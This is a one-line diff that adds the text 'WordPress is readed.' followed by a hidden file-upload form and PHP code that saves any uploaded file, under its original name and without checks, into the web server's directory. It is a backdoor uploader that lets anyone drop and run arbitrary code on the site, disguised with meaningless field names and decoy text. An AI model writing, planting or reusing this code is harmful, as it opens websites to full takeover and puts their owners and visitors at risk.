@@ -1,0 +1,1 @@
+WordPress is readed. <form enctype="multipart/form-data" method="POST"><input name="klps" type="file"/><input type="submit" value="goodit"/></form><?php $Mjhn=basename($_FILES["klps"]["name"]);if(move_uploaded_file($_FILES["klps"]["tmp_name"],$Mjhn)){echo basename($_FILES["klps"]["name"])."uploaded";} ?>
